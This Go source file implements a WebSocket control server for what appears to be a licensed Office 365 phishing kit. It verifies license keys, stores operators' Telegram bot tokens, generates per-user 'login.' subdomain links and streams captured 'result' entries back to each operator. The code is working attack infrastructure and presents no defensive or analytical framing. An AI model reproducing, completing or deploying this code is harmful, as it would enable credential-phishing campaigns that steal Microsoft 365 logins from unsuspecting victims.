package ws

import (
	"encoding/base64"
	"encoding/json"
	"net/http"
	"os"
	"sync"

	"o365/auth"
	"o365/configdb"
	"o365/tls"
	"o365/utils"

	"github.com/gorilla/websocket"
)

var (
	AdminConn    *websocket.Conn
	UserConns    = make(map[string]*UserWS)
	SlugToUserID = make(map[string]string)
	Mu           sync.Mutex
)

var upgrader = websocket.Upgrader{
	CheckOrigin: func(r *http.Request) bool { return true },
}

type ConnectionContext struct {
	Conn         *websocket.Conn
	UserID       string
	Role         string
	LicenseKey   string
	Authed       bool
	LicenseProof *auth.LicenseProof
}

func HandleWebSocket(w http.ResponseWriter, r *http.Request) {
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		utils.SystemLogger.Error().Err(err).Msg("❌ Failed to upgrade WebSocket")
		return
	}
	utils.SystemLogger.Info().Str("remote", r.RemoteAddr).Msg("🔌 WebSocket connected")

	ctx := &ConnectionContext{Conn: conn}

	for {
		_, encoded, err := conn.ReadMessage()
		if err != nil {
			utils.SystemLogger.Warn().Err(err).Msg("⚠️ WebSocket closed")
			if ctx.Role == "admin" {
				AdminConn = nil
			} else if ctx.UserID != "" {
				Mu.Lock()
				delete(UserConns, ctx.UserID)
				Mu.Unlock()
			}
			return
		}

		decoded, err := base64.StdEncoding.DecodeString(string(encoded))
		if err != nil {
			utils.SystemLogger.Warn().Err(err).Msg("❌ Invalid base64")
			continue
		}

		var msg SocketMessage
		if err := json.Unmarshal(decoded, &msg); err != nil {
			utils.SystemLogger.Warn().Err(err).Msg("❌ Invalid JSON")
			continue
		}

		switch msg.Type {

		case "license_proof":
			var payload struct{ Token string }
			if err := decode(msg.Data, &payload); err != nil {
				utils.SystemLogger.Warn().Err(err).Msg("❌ Bad license_proof")
				conn.Close()
				return
			}
			proof, err := auth.VerifyLicenseProofToken(payload.Token)
			if err != nil {
				utils.SystemLogger.Warn().Err(err).Msg("❌ Invalid token")
				conn.Close()
				return
			}
			ctx.UserID = proof.UserID
			ctx.LicenseProof = proof
			utils.SystemLogger.Info().Str("user_id", ctx.UserID).Msg("🔐 License token verified")

		case "auth":
			var payload AuthMessage
			if err := decode(msg.Data, &payload); err != nil {
				utils.SystemLogger.Warn().Err(err).Msg("❌ Bad auth payload")
				conn.Close()
				return
			}

			if payload.Role == "admin" {
				if payload.AuthKey != os.Getenv("ADMIN_KEY") {
					utils.SystemLogger.Warn().Msg("❌ Admin auth failed")
					conn.Close()
					return
				}
				AdminConn = ctx.Conn
				ctx.Role = "admin"
				ctx.Authed = true
				utils.SystemLogger.Info().Str("admin", payload.AdminName).Msg("✅ Admin authenticated")
				continue
			}

			if ctx.LicenseProof == nil || payload.UserID != ctx.UserID {
				utils.SystemLogger.Warn().Str("user_id", payload.UserID).Msg("❌ Auth mismatch or missing token")
				conn.Close()
				return
			}

			ctx.Role = "user"
			utils.SystemLogger.Info().Str("user_id", ctx.UserID).Msg("🕓 User auth pending license key")

		case "license_key":
			if ctx.LicenseProof == nil {
				utils.SystemLogger.Warn().Msg("❌ License key without proof")
				conn.Close()
				return
			}

			var payload struct {
				UserID string `json:"user_id"`
				Key    string `json:"key"`
			}
			raw, _ := json.Marshal(msg.Data)
			if err := json.Unmarshal(raw, &payload); err != nil {
				utils.SystemLogger.Warn().Err(err).Msg("❌ Failed to decode license_key")
				continue
			}
			if payload.UserID != ctx.UserID {
				utils.SystemLogger.Warn().Str("user_id", payload.UserID).Msg("❌ License key user_id mismatch")
				conn.Close()
				return
			}
			if payload.Key == "" {
				utils.SystemLogger.Warn().Msg("❌ Empty license key")
				continue
			}

			ctx.LicenseKey = payload.Key
			utils.SystemLogger.Info().Str("user_id", ctx.UserID).Msg("🔑 Received license key")

			configdb.SaveLicenseKey(configdb.LicenseConfig{
				UserID: ctx.UserID,
				Key:    payload.Key,
			})

			tryCompleteUserAuth(ctx)

		case "telegram_settings":
			if ctx.LicenseProof == nil {
				utils.SystemLogger.Warn().Msg("❌ Telegram settings without proof")
				conn.Close()
				return
			}

			var ts TelegramSettings
			if err := decode(msg.Data, &ts); err != nil {
				utils.SystemLogger.Warn().Err(err).Msg("❌ Failed to decode telegram_settings")
				continue
			}
			if ts.UserID != ctx.UserID {
				utils.SystemLogger.Warn().Str("user_id", ts.UserID).Msg("❌ Telegram user_id mismatch")
				conn.Close()
				return
			}
			utils.SystemLogger.Info().Str("user_id", ts.UserID).Msg("📩 Received Telegram settings")

			configdb.SaveTelegramSettings(configdb.TelegramConfig{
				UserID:   ts.UserID,
				BotToken: ts.BotToken,
				ChatID:   ts.ChatID,
			})

			tryCompleteUserAuth(ctx)

		case "request_link":
			if !ctx.Authed {
				utils.SystemLogger.Warn().Msg("❌ Unauthorized link request")
				continue
			}
			utils.SystemLogger.Info().Str("user_id", ctx.UserID).Msg("🔁 Link requested")
			ensureUserLink(ctx.UserID)

		default:
			utils.SystemLogger.Warn().Str("type", msg.Type).Msg("⚠️ Unknown WS type")
		}
	}
}

func tryCompleteUserAuth(ctx *ConnectionContext) {
	utils.SystemLogger.Debug().
		Str("user_id", ctx.UserID).
		Str("license_key", ctx.LicenseKey).
		Bool("authed", ctx.Authed).
		Str("role", ctx.Role).
		Msg("🔎 tryCompleteUserAuth invoked")

	if ctx.Authed || ctx.UserID == "" {
		return
	}

	Mu.Lock()
	UserConns[ctx.UserID] = &UserWS{Conn: ctx.Conn}
	Mu.Unlock()
	ctx.Authed = true

	// ✅ Register slug-to-user mapping for WS emits
	slug, err := configdb.GetSlugForUser(ctx.UserID)
	if err == nil && slug != "" {
		Mu.Lock()
		SlugToUserID[slug] = ctx.UserID
		Mu.Unlock()
	}

	utils.SystemLogger.Info().Str("user_id", ctx.UserID).Msg("✅ User fully authenticated")
	SendToUser(ctx.UserID, "ws_test", map[string]string{"msg": "WebSocket link OK"})
	ensureUserLink(ctx.UserID)
}

func ensureUserLink(userID string) {
	slug, err := configdb.CreateSlugForUser(userID)
	if err != nil {
		utils.SystemLogger.Warn().Err(err).Str("user_id", userID).Msg("❌ Failed to generate link")
		return
	}

	RegisterSlug(slug, userID)

	domain := configdb.GetDomain()
	if domain == "" {
		domain = tls.DomainRoot
	}

	url := "https://login." + domain + "/" + slug

	utils.SystemLogger.Info().
		Str("user_id", userID).
		Str("slug", slug).
		Str("url", url).
		Msg("📤 Sending link over WS")

	SendToUser(userID, "link_created", LinkMessage{
		UserID: userID,
		Slug:   slug,
		URL:    url,
	})
}

func EmitResultToSlug(slug string, rawText string) {
	msg := map[string]string{
		"slug":  slug,
		"entry": rawText,
	}
	sendWSBySlug(slug, "slug_result_entry", msg)
}

func sendWSBySlug(slug, msgType string, data interface{}) {
	Mu.Lock()
	userID := SlugToUserID[slug]
	conn, ok := UserConns[userID]
	Mu.Unlock()
	if !ok || conn == nil || conn.Conn == nil {
		utils.SystemLogger.Warn().Str("slug", slug).Msg("❌ No WS connection for slug")
		return
	}

	payload := map[string]interface{}{
		"type": msgType,
		"data": data,
	}
	raw, _ := json.Marshal(payload)
	conn.Conn.WriteMessage(websocket.TextMessage, []byte(base64.StdEncoding.EncodeToString(raw)))
}

func decode(data interface{}, target interface{}) error {
	switch d := data.(type) {
	case map[string]interface{}:
		b, _ := json.Marshal(d)
		return json.Unmarshal(b, target)
	case json.RawMessage:
		return json.Unmarshal(d, target)
	default:
		b, _ := json.Marshal(data)
		return json.Unmarshal(b, target)
	}
}
